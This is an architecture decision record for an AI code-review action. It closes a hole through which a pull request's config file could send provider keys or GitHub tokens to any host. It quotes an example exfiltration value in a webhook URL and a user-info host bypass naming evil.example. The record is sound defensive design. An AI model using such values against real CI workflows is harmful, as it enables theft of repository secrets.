# ADR-0019: The configuration file cannot decide where a secret goes

- **Status**: Accepted
- **Date**: 2026-11-09

## Context

The review reads `ai-review.config.yaml` from the checked-out workspace. On a pull request that is the file written by the author of the pull request. The file could send secrets elsewhere in two ways:

- `review.apiBaseUrl` and `reply.apiBaseUrl` accepted any `https://` host, and the provider key is sent to that host (`x-api-key`, `Authorization: Bearer`).
- every string in the file interpolated any `${UPPER_SNAKE}` variable. The environment of the action holds `GITHUB_TOKEN`, the optional `AI_REVIEW_RESOLVE_TOKEN` (a personal access token with `repo` scope) and the provider keys. `review.exportWebhookUrl` accepts any `https://` host and receives a POST, so `https://host/?t=${AI_REVIEW_RESOLVE_TOKEN}` was enough to send a token out.

Together with a workflow that runs a pull request with secrets (see the fork guard of `/review`), this lets the author of a pull request read the secrets.

## Decision

1. A variable whose name looks like a secret is interpolated only under `auth.*`. Everywhere else the load fails with a `ConfigError` that names the field and the variable.
2. A URL that receives data must point at an approved host. `apiBaseUrl` accepts the hosts of the built-in providers; every other host, and every `exportWebhookUrl` host, must be in `AI_REVIEW_ALLOWED_HOSTS`. That variable is set only from the `allowed-hosts` input of the action (and of the reusable workflow), never from the file.
3. The check uses the parsed host name, so user-info (`https://api.anthropic.com@evil.example`) and look-alike prefixes do not pass. Exact names only, no wildcards.

## Why

The rule is about who decides. The workflow file belongs to the repository owner; the configuration file may belong to the author of a pull request. A host list in the file would be approved by the person it is meant to restrain. The precedent is the TL gate, whose keys are read from the target branch for the same reason (docs/config.md).

## Consequences

- A user of the `openai` provider with a self-hosted endpoint, or of `exportWebhookUrl`, must add one line (`allowed-hosts`) to the workflow. A run without it fails at load time with a message that gives the line to add.
- Reading the whole file from the target branch would be stronger, but it changes how every key is loaded and how a repository tries a new config in a pull request. It is not done here.
- `gitlab.baseUrl` and `azure.orgUrl` are not covered; they apply to the GitLab and Azure DevOps providers only and are a follow-up.
